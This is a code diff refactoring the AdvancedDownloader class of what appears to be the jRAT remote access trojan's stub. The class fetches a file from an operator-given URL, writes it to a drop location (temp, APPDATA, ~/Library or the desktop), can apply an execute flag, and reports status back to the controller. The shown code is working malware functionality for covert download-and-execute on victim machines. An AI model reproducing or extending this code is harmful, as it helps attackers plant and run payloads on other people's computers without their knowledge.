@@ -1,5 +1,6 @@
 package io.jrat.stub;
 
+import io.jrat.common.DropLocations;
 import io.jrat.stub.packets.outgoing.Packet27URLStatus;
 
 import java.io.File;
@@ -9,21 +10,18 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.Random;
 
-import com.redpois0n.oslib.OperatingSystem;
-
-
 public class AdvancedDownloader extends Thread {
 
 	private Connection con;
-	public String url;
-	public boolean exec;
-	public String drop;
+	private String url;
+	private boolean exec;
+	private int location;
 
-	public AdvancedDownloader(Connection con, String url, boolean exec, String drop) {
+	public AdvancedDownloader(Connection con, String url, boolean exec, int location) {
 		this.con = con;
 		this.url = url;
 		this.exec = exec;
-		this.drop = drop;
+		this.location = location;
 	}
 
 	public void run() {
@@ -46,19 +44,7 @@ public class AdvancedDownloader extends Thread {
 				fileName = (new Random().nextInt()) + url.substring(url.lastIndexOf(".") + 1, url.length());
 			}
 
-			if (drop.equals("temp/documents (unix)")) {
-				file = new File(System.getProperty("java.io.tmpdir"), fileName);
-			} else if (drop.equals("appdata")) {
-				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
-					file = new File(System.getenv("APPDATA") + "\\" + fileName);
-				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
-					file = new File(System.getProperty("user.home") + "/Library/" + fileName);
-				} else {
-					file = new File(System.getProperty("java.io.tmpdir"), fileName);
-				}
-			} else if (drop.equals("desktop")) {
-				file = new File(System.getProperty("user.home") + "/Desktop/" + fileName);
-			}
+			file = DropLocations.getFile(location, fileName);
 
 			InputStream in = ucon.getInputStream();
 			FileOutputStream fout = new FileOutputStream(file);
@@ -79,7 +65,7 @@ public class AdvancedDownloader extends Thread {
 
 		} catch (Exception ex) {
 			ex.printStackTrace();
-			
+
 			con.addToSendQueue(new Packet27URLStatus(url, "Error: " + ex.getMessage()));
 		}
 	}
